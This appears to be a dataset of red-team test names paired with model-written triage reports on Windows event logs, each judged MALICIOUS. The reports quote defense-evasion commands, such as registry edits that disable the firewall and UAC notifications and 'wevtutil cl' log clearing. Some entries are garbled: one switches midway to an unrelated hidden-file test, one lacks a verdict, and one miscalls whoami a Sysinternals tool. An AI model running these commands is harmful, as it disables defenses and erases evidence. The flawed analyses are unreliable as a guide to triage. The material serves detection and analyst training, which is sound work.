   - **PowerShell Execution**: There is an execution of PowerShell logged in the Sysmon events. Though PowerShell is commonly used for legitimate administrative tasks, it is also frequently exploited in attacks. However, without more context on what commands were executed, we cannot definitively mark this as malicious solely on presence.
   
   - **JavaScript Compilation**: The command-line parameters for ""cmd.exe"" indicate an attempt to compile a JavaScript file using ""jsc.exe"". This may imply scripting activity, possibly for malicious automation tasks. If ""hello.js"" is not a recognized script used legitimately, this could suggest malicious intent.
  
3. **Use of Sysinternals Tools:**
   - **Whoami and Hostname Executions**: Alongside the logs cleared using ""wevtutil"", there are executions for ""whoami.exe"" and ""hostname.exe"". When used outside of typical administrative contexts and alongside other suspicious activities, these tools can be indicative of an attacker gathering information on the system or user.

**Assessment of the Situation**

- **Indicators of Malicious Activity**: There are clear indicators of malicious activity, primarily centered around the deliberate clearing of event logs using both system and custom log-clearing tools (e.g., wevtutil), likely to cover tracks of other malicious actions. The combination of such log-clearing activities with the execution of PowerShell and command-line scripting tools points towards a potential compromise.

**Threats or Risks Identified:**
- The log-clearing activities could mean sensitive operations have taken place on the CEO's machine or other systems that the attacker wants to hide.
- Execution of scripts and tools commonly used by attackers are high risk, especially under obscured or high-integrity contexts.

**Guidance on How to Proceed:**
1. **Immediate Incident Response**:
   - Mark this activity and the user account as potential threats.
   - Isolate the affected systems to prevent further unauthorized access.
   - Investigate the origin and content of any files and scripts used, such as ""hello.js"" or any PowerShell scripts executed.
2. **Forensic Analysis**:
   - Use backup and recovery techniques to retrieve previous logs if possible.
   - Further analyze any available packet captures, application logs, or IDS/IPS logs to identify additional evidence of compromise.
3. **Strengthen Security Posture**:
   - Review and reinforce the logging and monitoring policies to capture more granular data in the future.
   - Provide additional training on indicators of compromise and incident response procedures for IT and security personnel.

**Final Resolution**: **MALICIOUS** - The combination of log-clearing activities, suspicious process execution, and possible scripting activity justifies the classification as malicious activity with high certainty."
Disable Windows CMD application,"Based on the provided logs, there are several indicators of potentially malicious activity on the investigated Windows host, particularly related to the `admin_test` user account on SERVER002. Below are key findings from the logs:

### Indicators of Malicious Activity:

1. **Log Clearing Activity:**
   - In both the Security and System logs, there are entries indicating that logs were cleared by the `admin_test` account (Event ID 1102 in the Security log, Event ID 104 in the System log). Log clearing is often a tactic used by attackers to cover their tracks.

2. **Suspicious PowerShell Command:**
   - A PowerShell script is executed by `admin_test` to modify the registry to disable the command prompt (`DisableCMD`) (found in Windows PowerShell log and Sysmon log event for `powershell.exe`). This could be an attempt to restrict command-line usage, possibly to hinder forensic investigations or as part of an attack strategy.

3. **Unauthorized Privileged Actions:**
   - The use of `wevtutil.exe` by `admin_test` to clear event logs (Sysmon events showing execution of `wevtutil.exe`). Legitimate users rarely need to clear event logs, and its use can suggest an attempt to hide traces of malicious activity.

4. **Time Change Events:**
   - Events from the System log with Event ID 1 indicating system time changes. While not always malicious, it may be related to attempts to confuse logging or scheduled tasks.

### Assessment:
- The combination of the logs being cleared, the suspicious PowerShell command to modify critical system configurations, and the manipulation of system time collectively suggest possible malicious intentions.
- There is no direct evidence of data exfiltration or specific malware; however, the activities performed by the user `admin_test` are highly suspicious and align with techniques often used in lateral movement or privilege escalation attempts.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Incident Response:**
   - Isolate the affected machine from the network to prevent further malicious activities.
   - Conduct a thorough forensic investigation to understand the full scope of the incident, including examining other machines for the same indicators of compromise.
   - Check network logs for any unauthorized data transfers or lateral movements.
   
2. **User Account Audit:**
   - Review and, if necessary, change the credentials of `admin_test` and any associated privileges.
   - Monitor for any signs of credential harvesting tools or attacks targeting other accounts.

3. **Strengthen Security Posture:**
   - Implement enhanced monitoring using SIEM tools to identify similar PowerShell commands and log-clearing events.
   - Improve user awareness training focusing on social engineering and suspicious command execution.

4. **Patch and Hardening:**
   - Ensure the latest security patches and updates are applied across the system to close any known vulnerabilities.

By addressing these steps, the organization can mitigate the immediate threat and bolster defenses against future incidents."
LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"### Detailed Analysis of Logs:

1. **Log Clearing Activity**:
   - The security log shows an event (`EventID: 1102`) indicating that the audit log was cleared by the user `admin_test`. 
   - Corresponding entries in the system logs (`EventID: 104`) also show that the System and Windows PowerShell logs were cleared by the same user.
   - **Assessment**: Clearing event logs is a strong indicator of an attempt to cover tracks. When combined with the use of administrative privileges (`admin_test`), this is usually considered a hallmark of malicious activity.

2. **Registry Modification via Command Line**:
    - Sysmon logs (`EventID: 1`) indicate the execution of `cmd.exe` with a command to add a registry entry under `HKCU\Software\Policies\Microsoft\Windows\OOBE`. The registry key disables the privacy experience in Windows out-of-box experience (OOBE).
    - **Assessment**: Modifying registry keys associated with OS behavior without clear documentation or need can be suspicious, especially when executed directly with command-line arguments.

3. **Abnormal Use of `wevtutil.exe`**:
    - Multiple `Sysmon` logs indicate the use of `wevtutil.exe` to clear various event logs (including Security, Application, System).
    - The command lines used such as `""C:\\Windows\\system32\\wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""` confirm the clearing of logs.
    - **Assessment**: The explicit use of `wevtutil.exe` to clear logs further corroborates suspicious activities, often used after malicious actions to hinder forensic investigation.

4. **Utilization of Administrative Tools**:
    - Presence of `whoami.exe` execution, which displays user information, without any system administration task justification.
    - **Assessment**: While `whoami.exe` itself is not malicious, its usage in the context of other suspicious activities can highlight reconnaissance behavior.

5. **Legitimate Software Activity**:
    - The logs show updates and operations related to Edge Update services, including `MicrosoftEdgeUpdate.exe` and related paths.
    - These activities appear to be consistent with regular automatic updates from Microsoft Edge and do not indicate malice on their own.
    - **Assessment**: The Edge update entries appear to be legitimate and typical for a system that keeps software up-to-date.

### Threats and Risks Identified:
- The combination of event log clearing, suspicious registry modification, and high-level engagement with system utilities like `wevtutil.exe` and `cmd.exe` strongly suggest an attempt to conceal unauthorized or potentially harmful activities on the system.

LockBit Black - Unusual Windows firewall registry modification -cmd,"Based on the provided event logs, the following analysis can be made:

### Suspicious or Anomalous Behavior:

1. **Event Log Clearing:**
   - Multiple events show the use of `wevtutil.exe` to clear logs from several channels, including the ""Application"", ""Security"", and ""System"" event logs (Event ID 1102 for security log clearing). The command line shows the activity being performed by the user `admin_test`. Clearing event logs is a known tactic used by attackers to cover their tracks.

2. **Command-line Registry Manipulation:**
   - The command `cmd.exe` with the command line arguments to disable the Windows Firewall (`""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f ...`) is executed. Disabling the firewall can be part of a malicious attempt to allow unauthorized network access to the host.

3. **Potential Privilege Escalation:**
   - The events show the use of high-level privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, etc., which are indicative of admin-level rights being active. This might suggest that the user `admin_test` is running processes with escalated privileges.

4. **Processes Running with SYSTEM Integrity Level:**
   - Multiple processes related to Microsoft Edge Update were run with high integrity levels and the `User` is `NT AUTHORITY\SYSTEM`, suggesting these were legitimate scheduled updates.

### Indication of Malicious Activity:

- **Event Log Deletion:**
  The act of clearing event logs alone is generally considered an indicator of malicious behavior, as it is designed to hide other potentially malicious activities.

- **Registry Changes:**
  Direct modification of registry settings to disable firewalls without a legitimate reason can indicate malicious intent or an attempt to facilitate further attacks such as data exfiltration or remote control.

### Assessment:

**Resolution: MALICIOUS**

The pattern of clearing event logs, disabling security mechanisms like the firewall, and the use of escalated privileges strongly indicate malicious activity. These actions are typical of attackers attempting to establish persistence, evade detection, and reduce the system's security posture.

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Disconnect the affected system from the network to prevent further malicious actions.
   - Secure all affected accounts, especially those with administrative privileges, by resetting passwords and verifying recent activity.

2. **Investigate thoroughly:**
   - Conduct a comprehensive malware scan on the system.
   - Perform a forensic analysis to identify any unauthorized access, data corruption, or data exfiltration.
   - Look into other systems in the network to ensure the compromise has not spread.

3. **Remediation and Reporting:**
   - Restore the system from the last known clean backup if necessary.
   - Report the incident to the respective incident response team or authority in the organization for further action.

4. **Implement Preventive Measures:**
   - Strengthen system logging and monitoring to detect similar activities in the future.
   - Educate users on the importance of running with least privilege and recognizing potential phishing attacks or other entry points.

These steps should help mitigate the threat and guard against future attacks."
InstallUtil evasive invocation,"From the review and analysis of the logs provided, we observe a series of potentially concerning activities:

1. **PowerShell Execution**: The logs show the execution of a PowerShell script located in a temporary directory, which includes importing a module labeled ""AtomicRedTeam."" This is often associated with testing red team tactics, techniques, and procedures (TTPs). The PowerShell commands appear to involve the use of `InstallUtil.exe`, which is a common technique to bypass security controls via living off the land binaries (LOLBins). The specific reference to a test assembly and potential manipulation of files suggests either a penetration test or potentially malicious red team emulation.

2. **Event Log Clearing**: There are indications of various event logs being cleared, as seen in the system logs (e.g., EventID 1102 in security logs). Clearing logs can be an indicator of malicious behavior as it is often used by attackers to cover their tracks.

3. **Wevtutil Usage**: There are entries showing the use of `wevtutil.exe` to clear logs, which correlates with the log clearing events observed. This utility is often legitimate but can be employed by threat actors to erase tracks.

4. **.NET Compiler Processes**: There are traces of .NET compilation activities in a temporary directory, executed by admin_test. While this could correlate with legitimate software development activities, combined with the other events, this may suggest attempted execution of custom or obfuscated code potentially for malicious purposes.

5. **Anomalous Notepad Execution**: Logs show `notepad.exe` being invoked as `InstallUtil.exe` from `C:\Windows\System32\Tasks\`, which corresponds to suspicious usage typically aimed at executing binaries under false pretenses.

6. **User and System Account Usage**: There are logon events showing SYSTEM account activities and processes executed under NT AUTHORITY\SYSTEM. While some services normally run under this account, the combination with other logs warrants closer inspection.

**Assessment**:
Given the above observations, the logs indeed contain several indicators that align with known malicious techniques (such as execution via PowerShell, event log clearing, and the usage of wevtutil for this purpose, and the utilization of InstallUtil.exe in suspicious command sequences). The presence of these activities, especially in the context of an EDR alert and involvement of a high-value target machine such as a CEO's computer, adds significant credibility to concerns regarding potentially malicious actions.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
1. **Immediate Response**: Implement containment measures, such as network isolation of the affected system, to prevent further spread or data exfiltration.
2. **Forensic Investigation**: Conduct a detailed forensic investigation of the involved machine and user account activities (i.e., SERVER002\admin_test) to understand the full scope and impact.
3. **Log Examination**: Investigate the logs in greater scope and detail, especially focusing on sequence and correlation of activities observed.
4. **User Account Review**: Assess and review the access patterns and permissions associated with admin_test and other accounts involved.
5. **Security Posture Review**: Evaluate and bolster the security posture of the CEO's device and network segment involved, ensuring strong access controls and monitoring are in place.
6. **Engage with Security Teams**: Coordinate with blue team and threat intelligence teams to assess for indicators of compromise across the network to determine if this is an isolated incident or part of a larger threat.
7. **Incident Reporting**: Document and report the incident to internal security management and, if necessary, relevant external entities.

The evidence suggests a simulated attack or malicious activity, and action should be taken accordingly to mitigate any risks and secure the environment."
Snake Malware Encrypted crmlog file,"**Analysis of Windows Event Logs:**

1. **Process Execution:**
   - **whoami.exe**: There are multiple executions of whoami.exe under `SERVER002\admin_test`. While whoami.exe is a legitimate tool used to display logged-in user information, multiple executions could potentially be used in post-exploitation scenarios. However, by itself, this is not indicative of malicious activity.
   - **wevtutil.exe**: There is evidence of `wevtutil.exe` being used to clear logs from different channels (e.g., Sysmon, Application, System, Windows PowerShell, Security). Clearing event logs is a classic indicator of malicious activity, often used by attackers to hide their tracks.
   - **powershell.exe**: A PowerShell script created a hidden, system, and archived file in the Windows directory. The script's intention and its association with persistent threats or legitimate maintenance tasks like logging need further contextual analysis, but paired with the wevtutil activity, it is suspicious.
   - **taskhostw.exe, wuauclt.exe, AM_Delta.exe, MpSigStub.exe**: These are common system processes related to task scheduling, Windows updates, and malware definition updates. Their presence seems normal and typically expected on a Windows system.

2. **Event Log Clearance:**
   - **Sysmon, Application, System, Windows PowerShell, and Security logs** were all cleared around the same time by the user `admin_test`. This points towards an attempt to hide activities that had occurred on the system, which is a highly suspicious and potentially malicious action.

3. **Security Logs:**
   - Multiple Event ID 5379 entries relate to attempts at accessing Microsoft Account credentials, which resulted in failure (ReturnCode: 3221226021). Although these specific events were not successful, they might indicate an attempt to access sensitive account information.

**Assessment:**
- The invocation of legitimate tools like whoami, powershell, and wevtutil in such a pattern raises significant concerns. The clearing of event logs is especially alarming, as it explicitly suggests an effort to obfuscate actions performed on the system. The use of wevtutil to clear event logs alone could be considered a strong indicator of malicious activity when not associated with a legitimate administrative task.

**Resolution:**
- **MALICIOUS** - The logs contain activities consistent with evasion and potential post-exploitation processes. The combination of using legitimate system utilities to manipulate logs strongly indicates malicious activity.

**Guidance:**
- **Immediate actions**: Isolate the system (`Server002`) from the network to prevent further potential data exfiltration or lateral movement.
- **Detailed forensic investigation**: Acquire forensic images of affected systems for a more thorough analysis.
- **Review and assess**: Initiate an incident response process to review other systems for similar behavior and increase monitoring for similar activities.
- **Policy reinforcement and awareness training**: Educate users and administrators on the risks associated with misuse of admin privileges and encourage logging of all administrative actions.
- **Authentication validation**: Validate and, if necessary, reset credentials for the affected user account and evaluate the need for additional authentication hardening."
Set a firewall rule using New-NetFirewallRule,"Upon reviewing the provided logs, several indicators suggest unusual and potentially malicious activity on the host system. Here are the key observations:

1. **Event Log Clearing:**
   - Multiple instances of the `wevtutil.exe` tool being used to clear event logs (`System`, `Security`, and `Windows PowerShell`) are recorded (Event IDs 104 in the System log and 1102 in the Security log). This activity, particularly by the user `SERVER002\admin_test` with high integrity level processes, is highly suspicious. The clearing of logs is a technique often used by attackers to cover their tracks after conducting malicious activities.

2. **Suspicious PowerShell Execution:**
   - A PowerShell command is executed to create a new firewall rule allowing inbound TCP connections on port 21 (FTP) (PowerShell log Event ID 600). PowerShell is running with high integrity, which indicates that it has elevated privileges, and this kind of rule creation can potentially be exploited by an attacker to open up backdoors for remote access.

3. **Time Manipulation:**
   - The logs show kernel events indicating manipulation of system time. The `NewTime` is earlier than the `OldTime`, which might be a component of log tampering efforts. Changing system time can interfere with log capture and correlation, further complicating the forensic analysis process.

4. **Frequent Execution of `wevtutil.exe`:**
   - The Sysmon log shows numerous executions of `wevtutil.exe` with commands aimed at clearing logs. This repeated behavior amplifies the suspicion of malicious intent as `wevtutil.exe` is commonly used by attackers for such purposes.

5. **User Account Involved:**
   - The actions are performed by the account `SERVER002\admin_test`, indicating potential credential compromise or misuse of this user account.

Based on these findings, there is strong evidence to support that the event logs indicate malicious activities intentioned to cover tracks and potentially facilitate further unauthorized access.

**Resolution: MALICIOUS**
- The clearing of Event Logs combined with the suspicious execution of PowerShell scripts to modify firewall settings suggests malicious intent.
  
**Guidance:**
- Immediately perform an in-depth investigation to determine the full extent of systems affected.
- Conduct a review of account activities for `admin_test` to determine any other unauthorized actions taken with this account.
- Consider isolating the affected system from the network to prevent further damage or data exfiltration.
- Restore event logs from backup (if available) to ensure a full analysis can be conducted.
- Update security policies and tools to detect and alert for similar activities in the future.
- Conduct a security awareness session with users, emphasizing the significance of log data and reporting suspicious activities."
Disable Windows OS Auto Update,"Upon analyzing the provided Windows event logs, several suspicious activities stand out:

1. **Clearing of Event Logs**: We see multiple instances where event logs were cleared, indicated by EventID 104 in the System log, which shows the ""LogFileCleared"" event for ""admin_test"" clearing the event logs for multiple channels including System, Windows PowerShell, and also security logs (EventID 1102). This is typically a tactic used by malicious actors to cover their tracks after conducting unauthorized or malicious activities.

2. **Use of Eventing Command Line Utility (wevtutil.exe)**: The Sysmon log shows multiple instances of wevtutil.exe being executed with commands to clear (cl) logs such as Sysmon, Application, and Security logs at a high integrity level, all under the same user ""SERVER002\\admin_test."" The recurring execution of this utility is a red flag, especially when related to event log tampering.

3. **Suspicious Registry Modification**: There is a suspicious execution of a command (`cmd.exe /c reg add ...`) intended to disable Windows automatic updates. This kind of registry modification can be part of post-exploitation activities to maintain persistence or prevent system updates that might patch vulnerabilities used by an attacker.

4. **Execution of Administrative Commands**: The Sysmon log captures the execution of `whoami.exe`, `hostname.exe`, along with registry editing done through `reg.exe`, these can be indicative of activities to gather environment and user context post-breach. This execution pattern fits profiles of reconnaissance or post-exploitation actions.

Given these observations, the activities indicate a high likelihood of malicious intent, as they involve tactics commonly used by attackers, such as log clearing, persistence mechanism attempts, high-level execution of Windows utilities, and system modifications.

**Resolution: MALICIOUS**

**Threat/Risk Assessment & Guidance:**
- The clearing of logs to cover tracks and the execution of utilities to disable system features point to a malicious compromise.
- It is crucial to investigate the origin and intent of these activities further, particularly focusing on how the `admin_test` account was used or compromised.
- Immediate actions should include:
  - Isolate the affected machine to prevent further unauthorized activity.
  - Conduct a thorough investigation or forensic analysis to determine how access was achieved and what actions were taken.
  - Reset or audit all credentials and possibly initiate a broader compromise assessment.
  - Secure and restore event logging and investigate for any further persistence mechanisms installed or used by the attacker.
- Consider involving legal or incident response teams for comprehensive remediation and recovery."
Windows Add Registry Value to Load Service in Safe Mode with Network,"### Detailed Analysis:

#### Suspicious or Anomalous Behavior:

1. **Sysmon Logs:**
   - **Event Clearing:** Several instances of `wevtutil.exe` are logged with the action `cl`, which indicates clearing event logs. This activity is abnormal when executed frequently in a short period or by users who do not typically perform such tasks. It's notable that the command was executed on logs relating to `Microsoft-Windows-Sysmon`, `Application`, `System`, and `Security`. This behavior might be an attempt to cover tracks after malicious activities.
   - **Registry Modification:** The command `cmd.exe /c REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode""` is logged. This could be a persistence mechanism being established through registry modification under the guise of a safe boot configuration, which is typically associated with malware exhibiting stealthy, persistent behavior.
   - **Time Manipulation:** There are a couple of events indicating manipulation of system time (`EventID: 4616`), which can be a tactic to confuse logs or disrupt time-based security measures.

2. **System Logs:**
   - **Log Clearing Entries:** There are entries indicating that logs in channels like System and Windows PowerShell have been cleared intentionally (EventID: 104), with the user `admin_test` performing these actions. This behavior is suspicious especially when coupled with `wevtutil.exe` activity.
   
3. **Security Logs:**
   - **Event Clearing:** The Security logs show event clearing activity (EventID: 1102) performed by user `admin_test`. Clearing Security logs is highly suspicious as it is often used by attackers to erase evidence of a breach.
   
4. **EdgeUpdate Activity:**
   - A series of `MicrosoftEdgeUpdate.exe` executions were logged. While this may appear related to legitimate software updates, the timing, frequency, and pattern associated with other suspicious logs could indicate misuse or tampering involving legitimate processes to conduct malicious activities.

5. **Privilege Use:**
   - The presence of multiple high-privilege processes and actions (notably the `SeDebugPrivilege` and setting registry keys with elevated privileges) under `SERVER002\admin_test` is abnormal if the account does not typically perform such administrative tasks.

### Assessment:
Upon reviewing the logs, there are several indicators suggestive of malicious behavior. The frequent clearing of logs, registry modifications with `reg.exe`, and attempts to change system time hint at an attempt to obfuscate malicious activities or prepare for further exploitation.

### Threats or Risks Identified:
- **Evidence Tampering:** Frequent clearing of event logs represents an attempt to remove traces of potentially malicious activities.
- **Privilege Escalation and Persistence:** Registry modifications and high-integrity processes suggest escalation and persistence techniques indicative of malware behavior.
- **Potential Unauthorized Access:** The execution pattern of typical system processes in sequences and privilege escalations can denote unauthorized or malicious access.

### Resolution:
- **Resolution: MALICIOUS**
  - The activity observed in these logs is characteristic of post-exploitation actions commonly seen after initial unauthorized access, including log clearing, privilege escalation, and attempts to persist across reboots.

### Guidance on How to Proceed:

The provided logs exhibit a combination of benign and possibly malicious events that require further investigation. Let's break down the key findings:

1. **Unusual Command Execution:**
    - Multiple instances of `cmd.exe` executing with command lines that involve checks for a specific text file (`%temp%\T1564.001-9.txt`) and subsequently writing to it or checking its existence. These activities involve commands like `if exist` and `echo`.
    - The presence of PowerShell commands to change file attributes to 'hidden' related to `T1564.001-9.txt` indicates potential activity to hide or obfuscate actions or files.

2. **Log Deletion Activities:**
    - Event ID 1102 in the Security log signals that the audit log was cleared by the user `admin_test`. This is generally considered a suspicious activity, potentially indicative of attempts to cover up malicious actions.
    - System logs show the `wevtutil.exe` utility used to clear logs across multiple channels (e.g., Microsoft-Windows-Sysmon/Operational, System). This log tampering is a typical sign of malicious activity aiming to erase evidence.

3. **High Integrity Level Execution:**
    - Several processes like `cmd.exe`, `wevtutil.exe`, and `powershell.exe` executing commands at a High Integrity Level can be indicative of privilege escalation or an account with elevated privileges performing these actions.

4. **Network and Software Service Events:**
    - Although services like `Software Protection Platform Service` and `Microsoft Edge Update` exhibit regular service start and stop messages, the focus should remain more on the log tampering and hidden file activities.

5. **Indicators of MITRE ATT&CK Techniques:**
    - The activities show resemblance to techniques such as File and Directory Discovery (T1083), Log Deletion (T1070.001), and Masquerading (T1036), in particular, making files hidden which aligns with Defense Evasion (T1564).

**Assessment and Recommendation:**

- The logs contain clear evidence of suspicious activities like log clearing and attempts to hide evidence, which are strong indicators of malicious intent. The involvement of the `admin_test` user in these activities is troubling.
- Immediate steps should involve deeper investigation into the `admin_test` account, potential compromise scenarios, and inspection of related system artifacts not covered in these logs. This may involve retrieving additional logs, snapshots, and undertaking endpoint threat-hunting procedures.

**Conclusion:**

Based on the analysis of the logs, the resolution is marked as **MALICIOUS** due to the presence of log-clearing activities, command line executions intended to create and hide files, and the potential for privilege abuse or compromise. Immediate attention and incident response are warranted."
Invoke HTML Application - Direct download from URI,"Upon analyzing the provided Windows event logs, several indicators point to potentially malicious activity:

1. **Clearing of Event Logs**:
   - **Security Log**: Event ID 1102 indicates the security event log was cleared by the user `admin_test`. Clearing logs is a common tactic used by malicious actors to cover their tracks.
   - **Multiple `wevtutil.exe` Executions**: The `wevtutil.exe` process was used to clear various logs: `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Windows PowerShell`. This is a strong indicator of an attempt to cover up activities on this host.

2. **PowerShell Activity**:
   - The PowerShell logs indicate that `powershell.exe` was invoked with a command to execute an HTA file from a URI pointing to a known adversary simulation framework (Atomic Red Team). The command being executed is a known tactic to bypass normal security controls using `mshta.exe`.
   - `Invoke-ATHHTMLApplication` used here is a red team technique to execute potentially harmful scripts via an HTA file, which can be used for code execution.

3. **Sysmon Log Entries**:
   - The Sysmon logs corroborate the clearing of logs with `wevtutil.exe`, used multiple times in rapid succession by `admin_test`.
   - Additionally, Sysmon logs show the same PowerShell command execution, indicating a potentially unauthorized operation.

Based on these observations, the activities seen in these logs exhibit classic signs of a malicious intrusion:
- The clearing of event logs suggests an attempt to avoid detection.
- The use of PowerShell and an external HTA indicates potentially harmful scripts could have been run on this system.

**Final Assessment: MALICIOUS**

**Guidance on How to Proceed**:
1. **Isolate the Host**: Immediately isolate the affected machine (Server002) from the network to prevent potential lateral movement or data exfiltration.
2. **Conduct a Full Forensic Investigation**: Perform a detailed forensic analysis on the isolated host to uncover further details about the compromise, including any malware payloads, additional scripts, or modifications.
3. **Review and Audit User Accounts**: Verify the authenticity and credentials of `admin_test`. If compromised, change credentials and review account activity.
4. **Update Security Policies**: Ensure logging is enabled and secured to prevent unauthorized clearing. Consider implementing more stringent monitoring and alerting for log clearing activities.
5. **Malware Scanning**: Run comprehensive malware and antivirus scans on the affected system and possibly other systems within the network for signs of compromise.
6. **Patch and Re-evaluate Security Configurations**: Update all systems with the latest security patches and re-evaluate configurations to prevent the abuse of tools like PowerShell and `wevtutil`. Enable enhanced logging and monitoring specifically for PowerShell and administrative actions."
Provlaunch.exe Executes Arbitrary Command via Registry Key,"Based on the provided logs, let's analyze and break down the key findings:

### Suspicious and Anomalous Behavior
1. **Log Clearing Events:** 
   - **Security Log Cleared:** The security log was cleared by a user with the ID `admin_test` at timestamp `2024-10-25 21:55:50.1111209`.
   - **System Log Cleared:** The system log was also cleared by the same user (`admin_test`) at `2024-10-25 21:55:50.0670296` and `21:55:50.1449388`.
   - Log clearing typically indicates an attempt to cover tracks which is a strong indicator of potential malicious activity. 

2. **Usage of `wevtutil.exe`:** 
   - Sysmon log shows multiple executions of `wevtutil.exe` by the `admin_test` account. This tool can be used to query or clear Windows event logs, and the command lines include clearing multiple logs (Sysmon, Application, System, Security, and Windows PowerShell).

3. **Command Line Activity:**
   - The `cmd.exe` activity where registry settings are being manipulated (e.g., adding entries under `HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin`) and launching `calc.exe`. The `calc.exe` can sometimes be indicative of testing code execution or a LOLBin (Living Off the Land) technique.
   - The command `cmd.exe /c reg.exe add ...` followed by the launch of `provlaunch.exe` seems to be an attempt to execute a payload (`calc.exe` in this case) by modifying registry keys to run code off of a trusted binary - a potential malicious behavior often associated with persistence mechanisms.

4. **Time Manipulation:**
   - Time changes detected by the events `4616` in the security log, combined with system events indicating the time was manipulated by `svchost.exe`. Time manipulation can be used in advanced evasion techniques.

### Indicators of Compromise
- The clearing of logs alongside the suspicious use of system utilities (`wevtutil.exe`, registry changes via `cmd.exe`, `reg.exe`, and the use of `provlaunch.exe`) suggests attempts to either gather information, maintain persistence, or cover footprints of possibly unauthorized actions on the host.
- The observed behavior matches patterns typically associated with post-exploitation activities, often conducted once an attacker has gained access to evade detection or maintain long-term access.

### Assessment and Resolution
Given the combination of log clearing, use of system tools for potentially malicious purposes, registry changes, time manipulation, and the nature of the EDR alert:

- **Resolution: MALICIOUS**

### Guidance and Next Steps
1. **Containment:** Isolate the affected system (Server002) from the network to prevent further spread or unauthorized access.
2. **Further Investigation:** Conduct deeper forensic analysis on `Server002` to determine the origin of compromise, including looking for other signs of hidden malicious software.
3. **Credential Audit:** Since log clearing and other activities were performed by `admin_test`, immediately audit and potentially reset compromised credentials.
4. **Patch and Update:** Ensure all systems, particularly any with elevated permissions like `Server002`, are fully patched to mitigate exploitation.
5. **Review and Monitor:** Enhance monitoring of critical assets and review access logs to ensure similar activities are not occurring elsewhere.
6. **User Awareness:** Conduct spear-awareness sessions focusing on recognizing signs of potential compromise and best practices for avoiding phishing or social engineering."
Lolbin Gpscript startup option,"Upon reviewing the provided logs, here are the observations and findings related to potential indicators of malicious activity:

### Observations:

1. **Log Clearing Events**:
   - Security and System log files were cleared by a user with the username **admin_test** on **Server002**. The events indicate the use of **wevtutil.exe** to clear logs:
     - Security Log Clearance: `wevtutil cl Security`
     - System Log Clearance: `wevtutil cl System`
     - Windows PowerShell Log Clearance: `wevtutil cl ""Windows PowerShell""`

2. **Use of Administrative Commands**:
   - Multiple executions of `whoami.exe`, `wevtutil.exe`, and `conhost.exe` by the user SERVER002\admin_test with high integrity level, indicating potential use of administrative privileges.

3. **Suspicious Command Execution**:
   - The execution of `cmd.exe /c Gpscript /startup` is unusual and may indicate attempts to run potentially harmful scripts. This can be indicative of lateral movement or execution of startup tasks that may have been altered.

4. **Edge Update Activity**:
   - There is a significant amount of activity related to Microsoft Edge Update, primarily executed by the NT AUTHORITY\SYSTEM user, which is common behavior during application updates. However, the frequency and the presence of temp paths used for the executable may warrant verification to rule out misuse.

5. **Time Change Events**:
   - Multiple events regarding time changes (event IDs 4616) by LOCAL SERVICE using **svchost.exe** suggest some time synchronization. The repetitive occurrence in close succession could be benign, although it may be used to manipulate logging times.

### Assessment:

- **Log Clearing Evidence**: The clearing of the event logs using administrative tools like `wevtutil.exe`, particularly for the Security and System logs, is highly concerning. This behavior is often associated with attempts to cover tracks or erase forensic evidence post-compromise.
  
- **Suspicious Commands**: The use of commands and the spawning of child processes in a scripted or chaotic manner, especially within admin sessions, can indicate malicious behavior or unauthorized administrative activities.

- **Edge Update Anomalies**: Frequent Edge updates and installations could potentially hide malicious executables or scripts. However, this by itself is not definitive evidence of malicious activity without further context on why installations happened so frequently in such a short span.

### Conclusion:

Given the combination of log clearing activities, unusual command executions, and potential privilege use, the overall situation suggests an attempt at hiding actions, escalating privileges, or conducting unauthorized operations.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Incident Response Activation**: Immediately activate the incident response plan to contain and eradicate any potential threats.
2. **Forensic Analysis**: Conduct a thorough forensic analysis of the affected systems to retrieve residual data and logs that might still be intact.
3. **User Activity Review**: Review and audit user activity, focusing on SERVER002\admin_test and any use of elevated privileges.
4. **System Patch and Update Verification**: Assess the legitimacy of the Microsoft Edge updates to ensure no malicious payloads were delivered through these processes.
5. **Strengthen Audit Policies**: Post-incident, reinforce audit trails, and monitoring effectiveness to quickly detect similar future activities."
Disable UAC notification via registry keys,"Upon careful analysis of the log entries provided, several indicators suggest potentially suspicious or malicious activity:

1. **Clearing of Windows Event Logs**: The logs show multiple events where the event logs for the System, Security, and Windows PowerShell channels have been cleared by a user named `admin_test`. This activity is captured in the ""System"" and ""Security"" logs (`EventID: 104` for log file cleared in System logs and `EventID: 1102` in Security logs), which is typically an indicator of someone attempting to cover their tracks after performing unauthorized or suspicious activities.

2. **Command Line Utility Executions**: The `wevtutil.exe` command-line utility, responsible for managing event logs, is executed multiple times to clear event logs as observed in the Sysmon logs (`EventID: 1`). Activity involving `wevtutil` clearing the logs corresponds with the log clearing events in both the System and Security logs. This further solidifies attempts to remove traces of system activities.

3. **Registry Modification**: There is an execution of `cmd.exe` with a command to add a registry key that disables User Account Control (UAC) notifications (`reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f`). This indicates an attempt to suppress security warnings, a common technique used by attackers to maintain persistent access and execute further malicious actions unnoticed.

4. **Unusual Use of Sysinternals Tools**: Execution of commonly legitimate Windows tools, such as `hostname.exe` and `whoami.exe`, in rapid succession alongside clearing logs and modifying registry settings could suggest an exploration of system configuration or identity/context on the system's environment.

5. **Elevation and Privilege Misuse**: The command line for `cmd.exe` tasked with registry changes suggests the fluent use of elevated privileges by the user `admin_test`. This pattern is concerning as it aligns with typical malicious actor behavior post-compromise.

Based on the above observations, especially the clearing of Windows Event logs and registry modifications to disable UAC notifications, this activity aligns strongly with behaviors indicative of an attacker attempting to maintain stealth and bypass security controls. The systematic clearing of logs, coupled with registry changes, is a significant red flag.

**Resolution**: **MALICIOUS**

**Guidance on Proceeding**:
- Immediately isolate the affected system (Server002) to prevent further unauthorized access or spread of potential malware.
- Conduct a thorough forensic investigation to determine the full extent of the compromise.
- Consider resetting all relevant passwords, particularly for the `admin_test` account and any other accounts on the system.
